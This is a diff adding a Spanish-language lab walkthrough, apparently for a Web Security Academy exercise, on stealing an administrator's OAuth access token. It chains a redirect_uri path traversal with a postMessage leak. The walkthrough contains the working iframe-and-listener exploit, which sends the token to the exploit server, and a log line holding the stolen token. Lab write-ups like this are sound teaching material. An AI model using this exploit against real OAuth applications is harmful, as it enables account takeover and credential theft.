@@ -145,6 +145,60 @@ Con el token ya robado, se realiza una solicitud autenticada al endpoint /me del
 ```shell
 Authorization: Bearer tNH0OlglZFDHn3dvRQKYT_PCK8-ajs5pMV1k1Q5wXwZ
 ```
+## Reto 10: Robo de tokens de acceso OAuth a través de una página proxy
+
+Este laboratorio utiliza un servicio OAuth para permitir que los usuarios inicien sesión con su cuenta de redes sociales. La validación defectuosa del servicio OAuth permite que un atacante filtre tokens de acceso a páginas arbitrarias de la aplicación cliente.
+
+Para resolver el laboratorio, identifica una vulnerabilidad secundaria en la aplicación cliente y úsala como proxy para robar un token de acceso a la cuenta del administrador. Usa el token de acceso para obtener la clave API del administrador y envía la solución mediante el botón que aparece en el banner del laboratorio.
+
+El usuario administrador abrirá cualquier cosa que envíes desde el servidor de explotación y siempre tendrá una sesión activa con el servicio OAuth.
+
+Puedes iniciar sesión a través de tu cuenta de redes sociales utilizando las siguientes credenciales: wiener:peter. 
+
+Comprueba que el siguiente sitio codigo esta bien
+
+se revisa el flujo de autenticación OAuth desde Burp Suite. Se descubre que el parámetro redirect_uri admite rutas como ‘/../‘, lo que permite manipular la URL de redirección final, manteniéndola dentro del mismo dominio pero apuntando a rutas no previstas por el servidor. Aunque el dominio del redirect_uri está correctamente validado, esta técnica de path traversal permite eludir la restricción sin desencadenar errores.
+
+se audita la aplicación en busca de rutas que puedan actuar como proxy o facilitar la fuga de información. Se analiza la página /post/comment/comment-form, la cual está embebida en las entradas del blog mediante un iframe.
+
+Este formulario contiene un comportamiento inseguro: utiliza ‘window.postMessage()‘ para enviar la URL actual (window.location.href) al parent window, sin restringir el origen de destino (targetOrigin: ‘*’). Esto significa que cualquier página que lo cargue en un iframe podrá recibir esa información, incluida la fragmentación de la URL donde se encuentra el token de acceso.
+
+se combina todo lo aprendido para construir un exploit completo. Se crea un iframe que inicia el flujo OAuth con el redirect_uri apuntando al formulario de comentarios vulnerable, el cual reflejará el token en su propiedad ‘location.href‘.
+
+Debajo del iframe, se implementa un script que escucha eventos message desde el iframe, y envía los datos recibidos (incluyendo el token) como una petición al exploit server. Esto permite registrar en el access log el token de acceso del administrador.
+
+Una vez recibido el token, se utiliza en el endpoint /me del blog para realizar una petición autenticada como el administrador. La respuesta devuelve los datos personales y la API key, la cual se emplea para resolver el laboratorio.
+
+```shell
+<script>
+            parent.postMessage({type: 'onload', data: window.location.href}, '*')
+            function submitForm(form, ev) {
+                ev.preventDefault();
+                const formData = new FormData(document.getElementById("comment-form"));
+                const hashParams = new URLSearchParams(window.location.hash.substr(1));
+                const o = {};
+                formData.forEach((v, k) => o[k] = v);
+                hashParams.forEach((v, k) => o[k] = v);
+                parent.postMessage({type: 'oncomment', content: o}, '*');
+                form.reset();
+            }
+</script>
+```
 
 
+```
+<iframe src="http://oauth-0a0700df0463cd2780181a8002b300b2.oauth-server.net/auth?client_id=aibl0gpx1gclbpboeuoil&redirect_uri=https://0a4a00530473cded80731c20003800cc.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-358102052&scope=openid%20profile%20email"></iframe>
 
+<script>
+window.addEventListener('message', function(e) {
+    fetch("/" + encodeURIComponent(e.data.data));
+});
+
+</script>
+```
+
+
+En los logs aparece en la propia url el token de acceso robado:
+```
+10.0.4.205      2025-11-09 09:36:39 +0000 "GET /https%3A%2F%2F0a4a00530473cded80731c20003800cc.web-security-academy.net%2Fpost%2Fcomment%2Fcomment-form%23access_token%3DR-3tQqT32ziryGTSIVkfrNxtZR5DGwxodmGlKqO2qu3%26expires_in%3D3600%26token_type%3DBearer%26scope%3Dopenid%2520profile%2520email HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+```
